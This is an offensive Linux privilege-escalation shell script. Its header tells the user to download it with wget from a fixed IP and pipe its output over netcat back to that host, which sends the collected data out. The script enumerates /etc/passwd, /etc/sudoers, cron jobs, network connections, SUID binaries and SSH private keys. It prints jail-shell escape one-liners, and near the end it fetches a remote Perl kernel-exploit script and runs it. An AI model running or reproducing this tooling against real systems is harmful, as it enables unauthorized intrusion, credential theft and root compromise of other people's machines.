#!/bin/sh
echo "-[Linux Privilege Escalation Script v2 by nonXero]=--"
echo ""
echo "To use, run wget http://192.168.16.151/tmp/privesc/linux_privesc.sh on remote host"
echo "Then run, sh linux_privesc.sh | nc -vv 192.168.16.151 443 to transfer log to remote host"
echo ""
echo "Whats the distribution type? What version?"
echo "#####################################################################"
cat /etc/issue
cat /etc/*-release
echo ""
echo "What's the Kernel version?"
echo "#####################################################################"
uname -a
echo ""
echo "What users are on the system?"
cat /etc/passwd
echo ""
cat /etc/group
echo ""
echo "#####################################################################"
echo "What services are running? Which service has which user"
echo "#####################################################################"
ps -auxxx | grep root
echo ""
echo "What applications are installed?"
echo "#####################################################################"
dpkg -l
rpm -qa
echo ""
#echo "#####################################################################"
#echo "Find configuration files for services..."
#find /etc/ -name *.conf
#echo ""
echo "What jobs are scheduled?"
echo "#####################################################################"
crontab -l
ls -alh /var/spool/cron
ls -al /etc/cron*
cat /etc/cron*
echo ""
echo "What NIC(s) does the system have?"
echo "#####################################################################"
echo "- Hostname"
hostname
echo "- Network Interfaces:"
/sbin/ifconfig -a
echo "- Routing info:"
/sbin/route
echo "- ARP Cache:"
arp -a 
echo "- Current Network Connections:"
netstat -antup
echo ""
echo "What sudo commands can be ran?"
echo "#####################################################################"
sudo -l 2> /dev/null
echo ""
cat /etc/sudoers
echo ""
echo "Anything interesting in the home directorie(s)? If its possible to access"
echo "#####################################################################"
echo " - /root/"
ls -ahl /root/
echo ""
echo " - /home/"
ls -ahl /home/
echo "*** NOTE: Check for .bash_history files for clues, .ssh directories/keys and hidden directories/files for more clues..."
echo ""
echo "Can private-key information be found?"
echo "#####################################################################"
find /home/ -name authorized_keys 
echo ""
find /home/ -name id_*
echo ""
find /root/ -name authorized_keys 
echo ""
find /root/ -name id_*
echo ""
ls -lah /root/.ssh/
echo ""
echo "Any settings/files (hidden) on website?"
echo "#####################################################################"
ls -alh /var/www/
echo ""
echo "If commands are limited, you break out of the jail shell?"
echo "#####################################################################"
echo "python -c 'import pty;pty.spawn("/bin/bash")'"
echo "echo os.system('/bin/bash')"
echo "/bin/sh -i"
echo ""
echo "Are there any unmounted file-systems?"
echo "#####################################################################"
cat /etc/fstab
echo ""
echo "SUID OR GUID files..."
echo "#####################################################################"
find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -lh {} \; 2> /dev/null
echo ""
echo "What development tools/languages are installed/supported?"
echo "#####################################################################"
which perl
which gcc
which g++
which python
which php
which cc
echo ""
echo "How can files be uploaded?"
echo "#####################################################################"
which wget
which nc
which netcat
which scp
which ftp
which tftp
echo ""
echo "Searching for local exploits..."
wget "http://192.168.16.151/tmp/privesc/linux_kernel_exploiter.pl" 2> /dev/null
perl linux_kernel_exploiter.pl
echo "#####################################################################"
echo "#####################################################################"
echo "Done!"
